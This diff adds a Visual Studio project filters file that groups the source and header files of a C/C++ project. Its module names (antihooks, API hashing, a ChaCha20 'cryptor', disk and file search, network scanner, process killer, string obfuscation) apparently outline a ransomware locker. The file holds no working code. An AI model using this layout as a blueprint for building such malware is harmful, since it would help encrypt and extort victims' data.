@@ -1,0 +1,162 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Source files\antihooks">
+      <UniqueIdentifier>{cd24065a-24af-4830-9574-70fe4f446264}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\api">
+      <UniqueIdentifier>{a70a10d3-62fd-4514-938d-0ceddb0c9d6c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\cryptor">
+      <UniqueIdentifier>{0017c2df-dc30-4f64-8e35-4e7972ee20ab}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\cryptor\chacha20">
+      <UniqueIdentifier>{b9a379d5-4524-4cd7-afba-d95fcfbc0313}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\filesystem">
+      <UniqueIdentifier>{0abb98ab-53be-4848-b9fe-a638bb50e824}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\global">
+      <UniqueIdentifier>{f5658665-7b7e-49f1-aa77-1929f6d58d40}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\logs">
+      <UniqueIdentifier>{a77a01c6-bbf4-43f5-8e78-bf504984001b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\memory">
+      <UniqueIdentifier>{49f1e080-11c2-48a7-8a50-b817c6bef383}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\network_scanner">
+      <UniqueIdentifier>{14946c86-d5ac-4705-a4e5-968778f3cdb8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\obfuscation">
+      <UniqueIdentifier>{751341a5-2c8f-43e1-a2d6-36c6674d0d3e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\prockiller">
+      <UniqueIdentifier>{aefe40ae-20cf-49c3-a406-0d841a6e8049}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source files\threadpool">
+      <UniqueIdentifier>{7cf8a61d-4adf-496a-8ec0-ef623f78ee43}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="antihooks\antihooks.cpp">
+      <Filter>Source files\antihooks</Filter>
+    </ClCompile>
+    <ClCompile Include="api\getapi.cpp">
+      <Filter>Source files\api</Filter>
+    </ClCompile>
+    <ClCompile Include="api\hash.cpp">
+      <Filter>Source files\api</Filter>
+    </ClCompile>
+    <ClCompile Include="chacha20\chacha.c">
+      <Filter>Source files\cryptor\chacha20</Filter>
+    </ClCompile>
+    <ClCompile Include="cryptor.cpp">
+      <Filter>Source files\cryptor</Filter>
+    </ClCompile>
+    <ClCompile Include="filesystem\disks.cpp">
+      <Filter>Source files\filesystem</Filter>
+    </ClCompile>
+    <ClCompile Include="filesystem\search.cpp">
+      <Filter>Source files\filesystem</Filter>
+    </ClCompile>
+    <ClCompile Include="global\global_parameters.cpp">
+      <Filter>Source files\global</Filter>
+    </ClCompile>
+    <ClCompile Include="logs\logs.cpp">
+      <Filter>Source files\logs</Filter>
+    </ClCompile>
+    <ClCompile Include="memory.cpp">
+      <Filter>Source files\memory</Filter>
+    </ClCompile>
+    <ClCompile Include="network_scanner\network_scanner.cpp">
+      <Filter>Source files\network_scanner</Filter>
+    </ClCompile>
+    <ClCompile Include="threadpool\threadpool.cpp">
+      <Filter>Source files\threadpool</Filter>
+    </ClCompile>
+    <ClCompile Include="prockiller\prockiller.cpp">
+      <Filter>Source files\prockiller</Filter>
+    </ClCompile>
+    <ClCompile Include="main.cpp">
+      <Filter>Source files</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="antihooks\antihooks.h">
+      <Filter>Source files\antihooks</Filter>
+    </ClInclude>
+    <ClInclude Include="api\getapi.h">
+      <Filter>Source files\api</Filter>
+    </ClInclude>
+    <ClInclude Include="api\hash.h">
+      <Filter>Source files\api</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\chacha.h">
+      <Filter>Source files\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\ecrypt-config.h">
+      <Filter>Source files\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\ecrypt-machine.h">
+      <Filter>Source files\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\ecrypt-portable.h">
+      <Filter>Source files\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="chacha20\ecrypt-sync.h">
+      <Filter>Source files\cryptor\chacha20</Filter>
+    </ClInclude>
+    <ClInclude Include="cryptor.h">
+      <Filter>Source files\cryptor</Filter>
+    </ClInclude>
+    <ClInclude Include="filesystem\filesystem.h">
+      <Filter>Source files\filesystem</Filter>
+    </ClInclude>
+    <ClInclude Include="global\global_parameters.h">
+      <Filter>Source files\global</Filter>
+    </ClInclude>
+    <ClInclude Include="logs\logs.h">
+      <Filter>Source files\logs</Filter>
+    </ClInclude>
+    <ClInclude Include="memory.h">
+      <Filter>Source files\memory</Filter>
+    </ClInclude>
+    <ClInclude Include="network_scanner\network_scanner.h">
+      <Filter>Source files\network_scanner</Filter>
+    </ClInclude>
+    <ClInclude Include="threadpool\threadpool.h">
+      <Filter>Source files\threadpool</Filter>
+    </ClInclude>
+    <ClInclude Include="prockiller\prockiller.h">
+      <Filter>Source files\prockiller</Filter>
+    </ClInclude>
+    <ClInclude Include="obfuscation\MetaRandom2.h">
+      <Filter>Source files\obfuscation</Filter>
+    </ClInclude>
+    <ClInclude Include="obfuscation\MetaString.h">
+      <Filter>Source files\obfuscation</Filter>
+    </ClInclude>
+    <ClInclude Include="common.h">
+      <Filter>Source files</Filter>
+    </ClInclude>
+    <ClInclude Include="mrph.h">
+      <Filter>Source files</Filter>
+    </ClInclude>
+    <ClInclude Include="queue.h">
+      <Filter>Source files</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
